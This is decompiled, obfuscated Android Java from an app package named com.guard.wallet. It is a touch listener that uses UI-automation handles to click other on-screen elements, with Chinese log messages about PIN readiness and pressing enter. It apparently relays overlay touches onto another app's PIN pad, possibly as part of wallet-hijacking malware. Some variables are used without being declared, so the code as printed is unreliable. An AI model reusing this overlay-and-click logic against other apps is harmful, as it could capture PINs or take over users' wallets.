package com.guard.wallet.helper;

import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Stream;

public final class q implements OnTouchListener {
   public final o.e a;
   public final CombineFilter b;

   public q(o.e var1, CombineFilter var2) {
      this.a = var1;
      this.b = var2;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean onTouch(View var1, MotionEvent var2) {
      if (var2.getAction() == 0 && r.e != null) {
         boolean var4 = com.guard.wallet.utils.e.i();
         o.e var6 = this.a;
         if (var4 && r.g.size() != 10) {
            r.n(var6, this.b);
         }

         AtomicReference var17 = r.h;
         if (var17.get() == null) {
            r.h(var6);
         }

         if (!com.guard.wallet.utils.e.i() && !com.guard.wallet.utils.e.m() && r.j.get() == null) {
            r.i(var6);
         }

         Exception var10000;
         label135: {
            ConcurrentLinkedQueue var5;
            try {
               var5 = r.g;
               if (!var5.isEmpty()) {
                  Stream var8 = var5.stream();
                  p var7 = new p(var2, 0);
                  if (var8.anyMatch(var7)) {
                     return false;
                  }
               }
            } catch (Exception var16) {
               var10000 = var16;
               boolean var10001 = false;
               break label135;
            }

            label136: {
               try {
                  if (var17.get() != null
                     && ((UiObject)var17.get()).boundsInScreen().contains((int)var2.getX(), (int)var2.getY())
                     && ((UiObject)var17.get()).click()) {
                     var23 = r.c;
                     LinkedList var19 = var23.c;
                     if (!var19.isEmpty()) {
                        var19.remove(var19.size() - 1);
                     }
                     break label136;
                  }
               } catch (Exception var15) {
                  var10000 = var15;
                  boolean var27 = false;
                  break label135;
               }

               label111: {
                  label137: {
                     AtomicReference var25;
                     try {
                        var25 = r.j;
                        if (var25.get() != null
                           && ((UiObject)var25.get()).boundsInScreen().contains((int)var2.getX(), (int)var2.getY())
                           && ((UiObject)var25.get()).click()) {
                           break label137;
                        }
                     } catch (Exception var14) {
                        var10000 = var14;
                        boolean var28 = false;
                        break label135;
                     }

                     label138: {
                        try {
                           if (var5.isEmpty()) {
                              break label138;
                           }

                           Point var26 = new Point(var2.getX(), var2.getY());
                           var22 = r.j(var6, var26);
                        } catch (Exception var13) {
                           var10000 = var13;
                           boolean var29 = false;
                           break label135;
                        }

                        if (var22 == null) {
                           return false;
                        }

                        try {
                           if (var5.contains(var22)
                              || Objects.equals(var22.id(), "com.android.systemui:id/scrim_behind")
                              || var22.equals(var25.get())
                              || var22.equals(var17.get())
                              || !var22.click()) {
                              return false;
                           }
                        } catch (Exception var12) {
                           var10000 = var12;
                           boolean var30 = false;
                           break label135;
                        }

                        var18 = "已点击下方未知按钮";
                        break label111;
                     }

                     var18 = "PIN码未准备就绪,不允许点击下方按钮";
                     break label111;
                  }

                  var18 = "已点击回车键";
               }

               try {
                  Log.d("com.guard.wallet.helper.r", var18);
                  return false;
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var31 = false;
                  break label135;
               }
            }

            try {
               int var3 = r.f;
               LinkedList var24 = var23.b;
               if (!var24.isEmpty()) {
                  com.guard.wallet.plug.e var20 = new com.guard.wallet.plug.e(var3);
                  var24.removeIf(var20);
               }
            } catch (Exception var10) {
               var10000 = var10;
               boolean var32 = false;
               break label135;
            }

            try {
               r.f = r.f - 1;
               return false;
            } catch (Exception var9) {
               var10000 = var9;
               boolean var33 = false;
            }
         }

         Exception var21 = var10000;
         a1.q.s("com.guard.wallet.helper.r", var21);
      }

      return false;
   }
}
